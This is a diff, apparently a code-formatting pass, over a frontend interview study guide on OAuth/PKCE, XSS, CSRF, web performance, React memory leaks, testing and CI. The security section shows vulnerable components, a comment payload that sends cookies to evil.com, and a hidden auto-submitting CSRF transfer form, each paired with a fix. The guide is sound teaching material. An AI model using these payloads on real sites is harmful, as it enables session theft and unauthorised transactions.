-| `httpOnly` cookie + `SameSite=Strict` | None | None | Best practice |
+| Location                              | XSS Risk | CSRF Risk | Notes                                       |
+| ------------------------------------- | -------- | --------- | ------------------------------------------- |
+| `localStorage`                        | High     | None      | JS can read it — avoid for sensitive tokens |
+| `sessionStorage`                      | High     | None      | Cleared on tab close, still readable by JS  |
+| `httpOnly` cookie                     | None     | Moderate  | Cannot be read by JS — safest option        |
+| `httpOnly` cookie + `SameSite=Strict` | None     | None      | Best practice                               |
 
 ```ts
 // Reading a JWT payload (client-side, no library needed)
 function parseJwt(token: string) {
-  const base64 = token.split('.')[1].replace(/-/g, '+').replace(/_/g, '/');
+  const base64 = token.split(".")[1].replace(/-/g, "+").replace(/_/g, "/");
   return JSON.parse(window.atob(base64));
 }
 ```
@@ -1241,13 +1342,13 @@ function parseJwt(token: string) {
 function GoogleLogin() {
   function handleLogin() {
     const state = crypto.randomUUID(); // CSRF protection
-    sessionStorage.setItem('oauth_state', state);
+    sessionStorage.setItem("oauth_state", state);
 
     const params = new URLSearchParams({
-      client_id: 'YOUR_CLIENT_ID',
-      redirect_uri: 'https://yourapp.com/callback',
-      response_type: 'code',
-      scope: 'openid email profile',
+      client_id: "YOUR_CLIENT_ID",
+      redirect_uri: "https://yourapp.com/callback",
+      response_type: "code",
+      scope: "openid email profile",
       state,
     });
 
@@ -1262,25 +1363,25 @@ function GoogleLogin() {
 
 ```ts
 // GET /callback?code=...&state=...
-app.get('/callback', async (req, res) => {
+app.get("/callback", async (req, res) => {
   const { code, state } = req.query;
 
   // 1. Validate state to prevent CSRF
   const savedState = req.session.oauth_state;
   if (!state || state !== savedState) {
-    return res.status(400).send('Invalid state parameter');
+    return res.status(400).send("Invalid state parameter");
   }
 
   // 2. Exchange code for tokens
-  const tokenResponse = await fetch('https://oauth2.googleapis.com/token', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+  const tokenResponse = await fetch("https://oauth2.googleapis.com/token", {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: new URLSearchParams({
       code: code as string,
       client_id: process.env.GOOGLE_CLIENT_ID!,
       client_secret: process.env.GOOGLE_CLIENT_SECRET!, // NEVER send to frontend
-      redirect_uri: 'https://yourapp.com/callback',
-      grant_type: 'authorization_code',
+      redirect_uri: "https://yourapp.com/callback",
+      grant_type: "authorization_code",
     }),
   });
 
@@ -1288,9 +1389,12 @@ app.get('/callback', async (req, res) => {
   // { access_token, refresh_token, expires_in, token_type, id_token }
 
   // 3. Fetch user info
-  const userResponse = await fetch('https://www.googleapis.com/oauth2/v2/userinfo', {
-    headers: { Authorization: `Bearer ${tokens.access_token}` },
-  });
+  const userResponse = await fetch(
+    "https://www.googleapis.com/oauth2/v2/userinfo",
+    {
+      headers: { Authorization: `Bearer ${tokens.access_token}` },
+    },
+  );
   const user = await userResponse.json();
   // { id, email, name, picture }
 
@@ -1307,7 +1411,7 @@ app.get('/callback', async (req, res) => {
   req.session.userId = user.id;
 
   // 6. Redirect to app
-  res.redirect('/dashboard');
+  res.redirect("/dashboard");
 });
 ```
 
@@ -1315,14 +1419,14 @@ app.get('/callback', async (req, res) => {
 
 ```ts
 async function refreshAccessToken(refreshToken: string) {
-  const response = await fetch('https://oauth2.googleapis.com/token', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+  const response = await fetch("https://oauth2.googleapis.com/token", {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: new URLSearchParams({
       refresh_token: refreshToken,
       client_id: process.env.GOOGLE_CLIENT_ID!,
       client_secret: process.env.GOOGLE_CLIENT_SECRET!,
-      grant_type: 'refresh_token',
+      grant_type: "refresh_token",
     }),
   });
 
@@ -1336,13 +1440,13 @@ async function refreshAccessToken(refreshToken: string) {
 
 #### Common pitfalls
 
-| Mistake | Why it's bad | Correct approach |
-|---|---|---|
-| Exposing `client_secret` in frontend | Anyone can impersonate your app | Keep it server-side only |
-| Not validating `state` parameter | Vulnerable to CSRF | Generate random state, validate on callback |
-| Storing tokens in `localStorage` | XSS can steal them | Use `httpOnly` cookies or encrypted DB |
-| Not handling token expiry | API calls fail after ~1 hour | Refresh tokens before they expire |
-| Using Implicit Flow for SPAs | Deprecated, less secure | Use Authorization Code + PKCE instead |
+| Mistake                              | Why it's bad                    | Correct approach                            |
+| ------------------------------------ | ------------------------------- | ------------------------------------------- |
+| Exposing `client_secret` in frontend | Anyone can impersonate your app | Keep it server-side only                    |
+| Not validating `state` parameter     | Vulnerable to CSRF              | Generate random state, validate on callback |
+| Storing tokens in `localStorage`     | XSS can steal them              | Use `httpOnly` cookies or encrypted DB      |
+| Not handling token expiry            | API calls fail after ~1 hour    | Refresh tokens before they expire           |
+| Using Implicit Flow for SPAs         | Deprecated, less secure         | Use Authorization Code + PKCE instead       |
 
 #### PKCE (Proof Key for Code Exchange) — for SPAs
 
@@ -1353,39 +1457,42 @@ async function refreshAccessToken(refreshToken: string) {
 // 1. Generate code verifier and challenge
 function generatePKCE() {
   const verifier = base64UrlEncode(crypto.getRandomValues(new Uint8Array(32)));
-  const challenge = base64UrlEncode(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(verifier)));
+  const challenge = base64UrlEncode(
+    await crypto.subtle.digest("SHA-256", new TextEncoder().encode(verifier)),
+  );
   return { verifier, challenge };
 }
 
 // 2. Store verifier, send challenge in auth request
 const { verifier, challenge } = await generatePKCE();
-sessionStorage.setItem('pkce_verifier', verifier);
+sessionStorage.setItem("pkce_verifier", verifier);
 
 const params = new URLSearchParams({
-  client_id: 'YOUR_CLIENT_ID',
-  redirect_uri: 'https://yourapp.com/callback',
-  response_type: 'code',
-  scope: 'openid email',
+  client_id: "YOUR_CLIENT_ID",
+  redirect_uri: "https://yourapp.com/callback",
+  response_type: "code",
+  scope: "openid email",
   code_challenge: challenge,
-  code_challenge_method: 'S256',
+  code_challenge_method: "S256",
 });
 window.location.href = `https://provider.com/oauth/authorize?${params}`;
 
 // 3. On callback, exchange code + verifier for tokens (no client_secret needed)
-const verifier = sessionStorage.getItem('pkce_verifier');
-const tokenResponse = await fetch('https://provider.com/oauth/token', {
-  method: 'POST',
+const verifier = sessionStorage.getItem("pkce_verifier");
+const tokenResponse = await fetch("https://provider.com/oauth/token", {
+  method: "POST",
   body: new URLSearchParams({
     code: code as string,
-    client_id: 'YOUR_CLIENT_ID',
-    redirect_uri: 'https://yourapp.com/callback',
-    grant_type: 'authorization_code',
+    client_id: "YOUR_CLIENT_ID",
+    redirect_uri: "https://yourapp.com/callback",
+    grant_type: "authorization_code",
     code_verifier: verifier!,
   }),
 });
 ```
 
 **Key interview points:**
+
 - The `code` exchange happens **server-side** (or with PKCE for SPAs) — never expose `client_secret` to the browser.
 - Access tokens are short-lived (minutes to hours); refresh tokens are long-lived.
 - PKCE is now required for single-page apps per OAuth 2.1 spec.
@@ -1401,7 +1508,11 @@ const tokenResponse = await fetch('https://provider.com/oauth/token', {
 
 ```tsx
 // VULNERABLE: Comment system that displays user input without escaping
-function CommentList({ comments }: { comments: Array<{ author: string; text: string }> }) {
+function CommentList({
+  comments,
+}: {
+  comments: Array<{ author: string; text: string }>;
+}) {
   return (
     <ul>
       {comments.map((c, i) => (
@@ -1417,7 +1528,7 @@ function CommentList({ comments }: { comments: Array<{ author: string; text: str
 
 // Attacker submits comment:
 // "Check out my site! <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>"
-// 
+//
 // When other users view comments, the script executes in THEIR browser,
 // sending their session cookie to evil.com.
 ```
@@ -1425,7 +1536,11 @@ function CommentList({ comments }: { comments: Array<{ author: string; text: str
 **FIXED:**
 
 ```tsx
-function CommentList({ comments }: { comments: Array<{ author: string; text: string }> }) {
+function CommentList({
+  comments,
+}: {
+  comments: Array<{ author: string; text: string }>;
+}) {
   return (
     <ul>
       {comments.map((c, i) => (
@@ -1440,24 +1555,28 @@ function CommentList({ comments }: { comments: Array<{ author: string; text: str
 }
 
 // If rich text is required, sanitize with DOMPurify:
-import DOMPurify from 'dompurify';
+import DOMPurify from "dompurify";
 
 function RichComment({ html }: { html: string }) {
-  const clean = DOMPurify.sanitize(html, { ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'] });
+  const clean = DOMPurify.sanitize(html, {
+    ALLOWED_TAGS: ["b", "i", "em", "strong", "a"],
+  });
   return <div dangerouslySetInnerHTML={{ __html: clean }} />;
 }
 ```
 
 ##### Attack scenario 2: Reflected XSS (URL-based)
 
+{% raw %}
+
 ```tsx
 // VULNERABLE: Search page that echoes user query without escaping
 function SearchResults() {
-  const query = new URLSearchParams(window.location.search).get('q');
-  
+  const query = new URLSearchParams(window.location.search).get("q");
+
   return (
     <div>
-      <h1>Results for: {query}</h1>  {/* Safe in React */}
+      <h1>Results for: {query}</h1> {/* Safe in React */}
       {/* DANGER: If using vanilla JS or innerHTML */}
       <div dangerouslySetInnerHTML={{ __html: `Results for: ${query}` }} />
     </div>
@@ -1470,15 +1589,17 @@ function SearchResults() {
 // When victim clicks, the script executes in the victim's browser.
 ```
 
+{% endraw %}
+
 **FIXED:**
 
 ```tsx
 // React's JSX escapes by default — this is already safe:
-<h1>Results for: {query}</h1>
+<h1>Results for: {query}</h1>;
 
 // For vanilla JS, manually escape:
 function escapeHTML(str: string) {
-  const div = document.createElement('div');
+  const div = document.createElement("div");
   div.textContent = str;
   return div.innerHTML;
 }
@@ -1510,15 +1631,22 @@ Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
 ```html
 <!-- Attacker's website: evil.com -->
 <html>
-<body>
-  <h1>Claim your free gift!</h1>
-  <!-- Hidden form that auto-submits when page loads -->
-  <form id="attack" action="https://bank.com/transfer" method="POST" style="display:none">
-    <input name="to" value="attacker-account" />
-    <input name="amount" value="10000" />
-  </form>
-  <script>document.getElementById('attack').submit();</script>
-</body>
+  <body>
+    <h1>Claim your free gift!</h1>
+    <!-- Hidden form that auto-submits when page loads -->
+    <form
+      id="attack"
+      action="https://bank.com/transfer"
+      method="POST"
+      style="display:none"
+    >
+      <input name="to" value="attacker-account" />
+      <input name="amount" value="10000" />
+    </form>
+    <script>
+      document.getElementById("attack").submit();
+    </script>
+  </body>
 </html>
 
 <!-- If victim is logged into bank.com and visits evil.com,
@@ -1541,17 +1669,17 @@ Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
 
 ```tsx
 // Backend: Generate token per session
-app.post('/login', (req, res) => {
-  req.session.csrfToken = crypto.randomBytes(32).toString('hex');
-  res.cookie('csrf_token', req.session.csrfToken);
+app.post("/login", (req, res) => {
+  req.session.csrfToken = crypto.randomBytes(32).toString("hex");
+  res.cookie("csrf_token", req.session.csrfToken);
 });
 
 // Middleware: Validate token on state-changing requests
-app.use('/api', (req, res, next) => {
-  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
-    const tokenFromHeader = req.headers['x-csrf-token'];
+app.use("/api", (req, res, next) => {
+  if (["POST", "PUT", "DELETE"].includes(req.method)) {
+    const tokenFromHeader = req.headers["x-csrf-token"];
     if (tokenFromHeader !== req.session.csrfToken) {
-      return res.status(403).send('CSRF token mismatch');
+      return res.status(403).send("CSRF token mismatch");
     }
   }
   next();
@@ -1559,10 +1687,10 @@ app.use('/api', (req, res, next) => {
 
 // Frontend: Send token with every mutating request
 async function deleteUser(id: number) {
-  const csrfToken = getCookie('csrf_token');
+  const csrfToken = getCookie("csrf_token");
   await fetch(`/api/users/${id}`, {
-    method: 'DELETE',
-    headers: { 'X-CSRF-Token': csrfToken },
+    method: "DELETE",
+    headers: { "X-CSRF-Token": csrfToken },
   });
 }
 ```
@@ -1572,27 +1700,31 @@ async function deleteUser(id: number) {
 ```ts
 app.use((req, res, next) => {
   const origin = req.headers.origin || req.headers.referer;
-  if (origin && !origin.startsWith('https://yourapp.com')) {
-    return res.status(403).send('Invalid origin');
+  if (origin && !origin.startsWith("https://yourapp.com")) {
+    return res.status(403).send("Invalid origin");
   }
   next();
 });
 ```
 
 **Real-world impact:**
+
 - Without CSRF protection: Attacker can perform ANY action the logged-in user can (transfer money, change email, delete account)
 - With `SameSite=Strict`: Attack blocked by browser automatically
 
 #### Clickjacking
+
 Attacker embeds your site in an invisible iframe to trick users into clicking.
 
 **Mitigations:**
+
 ```http
 X-Frame-Options: DENY
 Content-Security-Policy: frame-ancestors 'none'
 ```
 
 #### Secure cookie flags
+
 ```http
 Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
 ```
@@ -1602,6 +1734,7 @@ Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
 - `SameSite=Strict` — not sent on cross-origin requests at all
 
 ### 4.5 References
+
 - [OWASP Top 10](https://owasp.org/www-project-top-ten/)
 - [jwt.io Introduction](https://jwt.io/introduction)
 - [OAuth 2.0 Simplified](https://www.oauth.com) — Authorization Code chapter
@@ -1612,18 +1745,20 @@ Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
 
 ### 5.1 Core Web Vitals
 
-| Metric | Measures | Good threshold |
-|---|---|---|
-| **LCP** (Largest Contentful Paint) | Load time of the main content | < 2.5 s |
-| **INP** (Interaction to Next Paint) | Responsiveness to user input | < 200 ms |
-| **CLS** (Cumulative Layout Shift) | Visual stability | < 0.1 |
+| Metric                              | Measures                      | Good threshold |
+| ----------------------------------- | ----------------------------- | -------------- |
+| **LCP** (Largest Contentful Paint)  | Load time of the main content | < 2.5 s        |
+| **INP** (Interaction to Next Paint) | Responsiveness to user input  | < 200 ms       |
+| **CLS** (Cumulative Layout Shift)   | Visual stability              | < 0.1          |
 
 #### What degrades LCP
+
 - Large unoptimised images (add `loading="lazy"`, use WebP, set `width`/`height`)
 - Render-blocking CSS or JS (`defer` scripts, inline critical CSS)
 - Slow server response (caching, CDN)
 
 #### What degrades CLS
+
 - Images without explicit dimensions
 - Fonts swapping after load (`font-display: swap` + preloading)
 - Dynamic content injected above existing content
@@ -1638,8 +1773,8 @@ Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
 <img
   src="/images/hero-800w.webp"
   srcset="
-    /images/hero-400w.webp 400w,
-    /images/hero-800w.webp 800w,
+    /images/hero-400w.webp   400w,
+    /images/hero-800w.webp   800w,
     /images/hero-1200w.webp 1200w
   "
   sizes="(max-width: 768px) 100vw, 800px"
@@ -1670,8 +1805,14 @@ Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
 <!-- AFTER: Inline critical CSS, defer non-critical (FCP: 0.8s) -->
 <style>
   /* Critical: Above-the-fold styles only (~10-15KB max) */
-  body { margin: 0; font-family: sans-serif; }
-  .hero { min-height: 100vh; background: #000; }
+  body {
+    margin: 0;
+    font-family: sans-serif;
+  }
+  .hero {
+    min-height: 100vh;
+    background: #000;
+  }
   /* ... */
 </style>
 
@@ -1691,8 +1832,8 @@ Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
 ```css
 /* BEFORE: Font swapping causes CLS */
 @font-face {
-  font-family: 'MyFont';
-  src: url('/fonts/myfont.woff2');
+  font-family: "MyFont";
+  src: url("/fonts/myfont.woff2");
 }
 
 /* AFTER: Preload + font-display prevents CLS */
@@ -1700,19 +1841,31 @@ Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
 ```
 
 ```html
-<link rel="preload" href="/fonts/myfont.woff2" as="font" type="font/woff2" crossorigin />
+<link
+  rel="preload"
+  href="/fonts/myfont.woff2"
+  as="font"
+  type="font/woff2"
+  crossorigin
+/>
 ```
 
 ```css
 @font-face {
-  font-family: 'MyFont';
-  src: url('/fonts/myfont.woff2');
+  font-family: "MyFont";
+  src: url("/fonts/myfont.woff2");
   font-display: swap; /* Shows fallback immediately, swaps when custom font loads */
 }
 
 /* Or use fallback font with similar metrics to avoid layout shift */
 body {
-  font-family: 'MyFont', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+  font-family:
+    "MyFont",
+    -apple-system,
+    BlinkMacSystemFont,
+    "Segoe UI",
+    Arial,
+    sans-serif;
 }
 ```
 
@@ -1722,7 +1875,7 @@ body {
 
 ```tsx
 // React.lazy + Suspense — only loads Dashboard when route is accessed
-const Dashboard = React.lazy(() => import('./Dashboard'));
+const Dashboard = React.lazy(() => import("./Dashboard"));
 
 function App() {
   return (
@@ -1736,16 +1889,16 @@ function App() {
 #### Advanced: Route-based + component-based splitting
 
 ```tsx
-import { lazy, Suspense } from 'react';
-import { BrowserRouter, Routes, Route } from 'react-router-dom';
+import { lazy, Suspense } from "react";
+import { BrowserRouter, Routes, Route } from "react-router-dom";
 
 // Route-level splitting — each route is a separate bundle
-const Home = lazy(() => import('./pages/Home'));
-const Dashboard = lazy(() => import('./pages/Dashboard'));
-const Profile = lazy(() => import('./pages/Profile'));
+const Home = lazy(() => import("./pages/Home"));
+const Dashboard = lazy(() => import("./pages/Dashboard"));
+const Profile = lazy(() => import("./pages/Profile"));
 
 // Component-level splitting — heavy components load on demand
-const HeavyChart = lazy(() => import('./components/HeavyChart'));
+const HeavyChart = lazy(() => import("./components/HeavyChart"));
 
 function App() {
   return (
@@ -1764,7 +1917,7 @@ function App() {
 // Usage in a page
 function Dashboard() {
   const [showChart, setShowChart] = useState(false);
-  
+
   return (
     <div>
       <h1>Dashboard</h1>
@@ -1794,28 +1947,31 @@ ETag: "abc123"
 
 #### Caching strategy comparison
 
-| Resource type | Cache-Control | Why |
-|---|---|---|
-| JS/CSS with hash (`main.a1b2c3.js`) | `public, max-age=31536000, immutable` | Hash changes when content changes — safe to cache forever |
-| Images, fonts | `public, max-age=2592000` (30 days) | Rarely change, but no hash in filename |
-| HTML | `no-cache` or `max-age=0, must-revalidate` | Always check server for updates |
-| API responses (user data) | `no-store` | Never cache sensitive data |
-| API responses (public data) | `public, max-age=300` (5 min) | Cache briefly to reduce server load |
+| Resource type                       | Cache-Control                              | Why                                                       |
+| ----------------------------------- | ------------------------------------------ | --------------------------------------------------------- |
+| JS/CSS with hash (`main.a1b2c3.js`) | `public, max-age=31536000, immutable`      | Hash changes when content changes — safe to cache forever |
+| Images, fonts                       | `public, max-age=2592000` (30 days)        | Rarely change, but no hash in filename                    |
+| HTML                                | `no-cache` or `max-age=0, must-revalidate` | Always check server for updates                           |
+| API responses (user data)           | `no-store`                                 | Never cache sensitive data                                |
+| API responses (public data)         | `public, max-age=300` (5 min)              | Cache briefly to reduce server load                       |
 
 ```ts
 // Backend: Set cache headers (Express example)
-app.use('/static', express.static('public', {
-  maxAge: '1y', // 1 year for static assets
-  immutable: true,
-}));
+app.use(
+  "/static",
+  express.static("public", {
+    maxAge: "1y", // 1 year for static assets
+    immutable: true,
+  }),
+);
 
-app.get('/api/products', (req, res) => {
-  res.set('Cache-Control', 'public, max-age=300'); // 5 minutes
+app.get("/api/products", (req, res) => {
+  res.set("Cache-Control", "public, max-age=300"); // 5 minutes
   res.json(products);
 });
 
-app.get('/api/user/profile', (req, res) => {
-  res.set('Cache-Control', 'no-store'); // Never cache
+app.get("/api/user/profile", (req, res) => {
+  res.set("Cache-Control", "no-store"); // Never cache
   res.json(userProfile);
 });
 ```
@@ -1832,20 +1988,20 @@ Memory leaks cause increasing memory usage over time, leading to slow performanc
 // LEAK — setInterval keeps running after component unmounts
 function BadTimer() {
   useEffect(() => {
-    const id = setInterval(() => console.log('tick'), 1000);
+    const id = setInterval(() => console.log("tick"), 1000);
     // forgot return! Interval runs forever even after component is gone
   }, []);
-  
+
   return <div>Timer</div>;
 }
 
 // FIXED
 function GoodTimer() {
   useEffect(() => {
-    const id = setInterval(() => console.log('tick'), 1000);
+    const id = setInterval(() => console.log("tick"), 1000);
     return () => clearInterval(id); // cleanup on unmount
   }, []);
-  
+
   return <div>Timer</div>;
 }
 ```
@@ -1857,10 +2013,10 @@ function GoodTimer() {
 function BadResizeHandler() {
   useEffect(() => {
     const handleResize = () => console.log(window.innerWidth);
-    window.addEventListener('resize', handleResize);
+    window.addEventListener("resize", handleResize);
     // forgot to remove! Listener stays forever
   }, []);
-  
+
   return <div>Resize handler</div>;
 }
 
@@ -1868,10 +2024,10 @@ function BadResizeHandler() {
 function GoodResizeHandler() {
   useEffect(() => {
     const handleResize = () => console.log(window.innerWidth);
-    window.addEventListener('resize', handleResize);
-    return () => window.removeEventListener('resize', handleResize);
+    window.addEventListener("resize", handleResize);
+    return () => window.removeEventListener("resize", handleResize);
   }, []);
-  
+
   return <div>Resize handler</div>;
 }
 ```
@@ -1882,28 +2038,28 @@ function GoodResizeHandler() {
 // LEAK — closure captures old state value
 function BadCounter() {
   const [count, setCount] = useState(0);
-  
+
   useEffect(() => {
     const id = setInterval(() => {
       setCount(count + 1); // Always adds to the initial count (0)
     }, 1000);
     return () => clearInterval(id);
   }, []); // Empty deps — count is stale
-  
+
   return <div>{count}</div>; // Stuck at 1
 }
 
 // FIXED — use functional update
 function GoodCounter() {
   const [count, setCount] = useState(0);
-  
+
   useEffect(() => {
     const id = setInterval(() => {
-      setCount(prev => prev + 1); // Reads latest value
+      setCount((prev) => prev + 1); // Reads latest value
     }, 1000);
     return () => clearInterval(id);
   }, []);
-  
+
   return <div>{count}</div>; // Counts correctly
 }
 ```
@@ -1914,33 +2070,33 @@ function GoodCounter() {
 // LEAK — fetch completes after unmount, tries to update state
 function BadUserProfile({ userId }: { userId: number }) {
   const [user, setUser] = useState(null);
-  
+
   useEffect(() => {
     fetch(`/api/users/${userId}`)
-      .then(r => r.json())
+      .then((r) => r.json())
       .then(setUser); // ERROR if component unmounted
   }, [userId]);
-  
+
   return <div>{user?.name}</div>;
 }
 
 // FIXED — abort controller
 function GoodUserProfile({ userId }: { userId: number }) {
   const [user, setUser] = useState(null);
-  
+
   useEffect(() => {
     const controller = new AbortController();
-    
+
     fetch(`/api/users/${userId}`, { signal: controller.signal })
-      .then(r => r.json())
+      .then((r) => r.json())
       .then(setUser)
-      .catch(err => {
-        if (err.name !== 'AbortError') console.error(err);
+      .catch((err) => {
+        if (err.name !== "AbortError") console.error(err);
       });
-    
+
     return () => controller.abort(); // cancels request on unmount
   }, [userId]);
-  
+
   return <div>{user?.name}</div>;
 }
 ```
@@ -1961,6 +2117,7 @@ function GoodUserProfile({ userId }: { userId: number }) {
 - [ ] Core Web Vitals: LCP < 2.5s, INP < 200ms, CLS < 0.1
 
 ### 5.6 References
+
 - [web.dev/vitals](https://web.dev/vitals/)
 - [web.dev/learn/performance](https://web.dev/learn/performance/)
 
@@ -1972,65 +2129,68 @@ function GoodUserProfile({ userId }: { userId: number }) {
 
 ```ts
 // sum.ts
-export function sum(a: number, b: number) { return a + b; }
+export function sum(a: number, b: number) {
+  return a + b;
+}
 
 // sum.test.ts
-import { sum } from './sum';
+import { sum } from "./sum";
 
-describe('sum', () => {
-  it('adds two positive numbers', () => {
+describe("sum", () => {
+  it("adds two positive numbers", () => {
     expect(sum(2, 3)).toBe(5);
   });
 
-  it('handles negative numbers', () => {
+  it("handles negative numbers", () => {
     expect(sum(-1, 1)).toBe(0);
   });
 });
 ```
 
 #### Mocking
+
 ```ts
 // Mock a module
-jest.mock('./api', () => ({
-  fetchUser: jest.fn().mockResolvedValue({ id: 1, name: 'Alice' }),
+jest.mock("./api", () => ({
+  fetchUser: jest.fn().mockResolvedValue({ id: 1, name: "Alice" }),
 }));
 
 // Mock a function
 const mockFn = jest.fn();
 mockFn.mockReturnValue(42);
-expect(mockFn).toHaveBeenCalledWith('arg');
+expect(mockFn).toHaveBeenCalledWith("arg");
 expect(mockFn).toHaveBeenCalledTimes(1);
 ```
 
 ### 6.2 React Testing Library — component testing
 
 ```tsx
-import { render, screen, fireEvent, waitFor } from '@testing-library/react';
-import userEvent from '@testing-library/user-event';
-import LoginForm from './LoginForm';
+import { render, screen, fireEvent, waitFor } from "@testing-library/react";
+import userEvent from "@testing-library/user-event";
+import LoginForm from "./LoginForm";
 
-describe('LoginForm', () => {
-  it('shows validation error for invalid email', async () => {
+describe("LoginForm", () => {
+  it("shows validation error for invalid email", async () => {
     render(<LoginForm />);
-    
-    await userEvent.type(screen.getByLabelText(/email/i), 'notanemail');
-    await userEvent.click(screen.getByRole('button', { name: /log in/i }));
 
-    expect(screen.getByRole('alert')).toHaveTextContent(/valid email/i);
+    await userEvent.type(screen.getByLabelText(/email/i), "notanemail");
+    await userEvent.click(screen.getByRole("button", { name: /log in/i }));
+
+    expect(screen.getByRole("alert")).toHaveTextContent(/valid email/i);
   });
 
-  it('calls onSubmit with form data', async () => {
+  it("calls onSubmit with form data", async () => {
     const onSubmit = jest.fn();
     render(<LoginForm onSubmit={onSubmit} />);
 
-    await userEvent.type(screen.getByLabelText(/email/i), 'alice@example.com');
-    await userEvent.type(screen.getByLabelText(/password/i), 'password123');
-    await userEvent.click(screen.getByRole('button', { name: /log in/i }));
+    await userEvent.type(screen.getByLabelText(/email/i), "alice@example.com");
+    await userEvent.type(screen.getByLabelText(/password/i), "password123");
+    await userEvent.click(screen.getByRole("button", { name: /log in/i }));
 
     await waitFor(() => {
       expect(onSubmit).toHaveBeenCalledWith({
-        email: 'alice@example.com',
-        password: 'password123',
+        email: "alice@example.com",
+        password: "password123",
       });
     });
   });
@@ -2038,10 +2198,12 @@ describe('LoginForm', () => {
 ```
 
 **Key RTL philosophy:** Query by what the user sees, not implementation details.
+
 - Prefer `getByRole`, `getByLabelText`, `getByText` over `getByTestId`
 - Test behavior, not internals (don't test state variables directly)
 
 ### 6.3 References
+
 - [React Testing Library docs](https://testing-library.com/docs/react-testing-library/intro/)
 - [jestjs.io/docs/getting-started](https://jestjs.io/docs/getting-started)
 
@@ -2065,6 +2227,7 @@ git rebase origin/main
 ```
 
 #### Merge vs rebase
+
 - **Merge** — preserves full history, adds a merge commit. Easier to understand for teams.
 - **Rebase** — rewrites history to be linear. Cleaner log but rewrites commits (never rebase shared branches).
 
@@ -2073,27 +2236,28 @@ git rebase origin/main
 ```yaml
 # Typical pipeline order (don't skip steps)
 stages:
-  - install          # npm ci
-  - lint             # eslint, stylelint
-  - typecheck        # tsc --noEmit
-  - test             # jest --ci --coverage
-  - build            # npm run build
-  - deploy           # push to staging/production
+  - install # npm ci
+  - lint # eslint, stylelint
+  - typecheck # tsc --noEmit
+  - test # jest --ci --coverage
+  - build # npm run build
+  - deploy # push to staging/production
 ```
 
 **Key points:**
+
 - `npm ci` (not `npm install`) in CI — uses exact lockfile versions, fails if lock is out of sync
 - Environment variables injected by the CI system, never committed to repo
 - `.env.local` for local dev, `.env.production` for build-time values
 
 ### 7.3 Rollback strategies
 
-| Strategy | How | When |
-|---|---|---|
-| **Redeploy previous** | Re-run previous pipeline | Fastest for most cases |
-| **Feature flags** | Toggle off the bad feature | Zero downtime, no redeploy |
-| **Blue/green** | Route traffic to stable environment | Large-scale, high-availability needs |
-| **Canary** | Gradually shift traffic | Progressive rollout safety |
+| Strategy              | How                                 | When                                 |
+| --------------------- | ----------------------------------- | ------------------------------------ |
+| **Redeploy previous** | Re-run previous pipeline            | Fastest for most cases               |
+| **Feature flags**     | Toggle off the bad feature          | Zero downtime, no redeploy           |
+| **Blue/green**        | Route traffic to stable environment | Large-scale, high-availability needs |
+| **Canary**            | Gradually shift traffic             | Progressive rollout safety           |
 
 ---
 
@@ -2108,12 +2272,12 @@ stages:
 
 ### Time management
 
-| Challenge type | Time target |
-|---|---|
-| Algorithmic (easy) | 10–15 min |
-| Algorithmic (medium) | 20–30 min |
-| Frontend UI component | 30–45 min |
-| Concept / MCQ | 1–2 min each |
+| Challenge type        | Time target  |
+| --------------------- | ------------ |
+| Algorithmic (easy)    | 10–15 min    |
+| Algorithmic (medium)  | 20–30 min    |
+| Frontend UI component | 30–45 min    |
+| Concept / MCQ         | 1–2 min each |
 
 A working but incomplete solution beats a perfect unfinished one. Always submit something.
 
@@ -2126,20 +2290,20 @@ A working but incomplete solution beats a perfect unfinished one. Always submit 
 
 ### Algorithmic problem patterns
 
-| Pattern | When to use |
-|---|---|
-| Two pointers | Sorted array, find pair/triplet |
-| Sliding window | Subarray/substring of length k |
-| HashMap/Set | Count frequencies, find duplicates |
-| Stack | Balanced brackets, undo operations |
-| Recursion | Tree traversal, divide and conquer |
+| Pattern        | When to use                        |
+| -------------- | ---------------------------------- |
+| Two pointers   | Sorted array, find pair/triplet    |
+| Sliding window | Subarray/substring of length k     |
+| HashMap/Set    | Count frequencies, find duplicates |
+| Stack          | Balanced brackets, undo operations |
+| Recursion      | Tree traversal, divide and conquer |
 
 ```js
 // HashMap frequency count — appears constantly
 function firstNonRepeating(str) {
   const freq = {};
   for (const ch of str) freq[ch] = (freq[ch] ?? 0) + 1;
-  return str.split('').find(ch => freq[ch] === 1) ?? '';
+  return str.split("").find((ch) => freq[ch] === 1) ?? "";
 }
 ```
 
@@ -2164,13 +2328,13 @@ Before your interview, you must be able to answer or code these without hesitati
 
 ## Quick reference — things interviewers often trick you on
 
-| Trap | Correct answer |
-|---|---|
-| `typeof null` | `"object"` (historical bug in JS) |
-| `0.1 + 0.2 === 0.3` | `false` (floating point precision) |
-| `[] == false` | `true` (type coercion — reason to always use `===`) |
-| `var` in a loop with setTimeout | Captures the final value, use `let` instead |
-| Mutating state directly in React | Never — always return a new reference |
+| Trap                                | Correct answer                                                 |
+| ----------------------------------- | -------------------------------------------------------------- |
+| `typeof null`                       | `"object"` (historical bug in JS)                              |
+| `0.1 + 0.2 === 0.3`                 | `false` (floating point precision)                             |
+| `[] == false`                       | `true` (type coercion — reason to always use `===`)            |
+| `var` in a loop with setTimeout     | Captures the final value, use `let` instead                    |
+| Mutating state directly in React    | Never — always return a new reference                          |
 | `useEffect` with missing dependency | Stale closure — always add all referenced values to deps array |
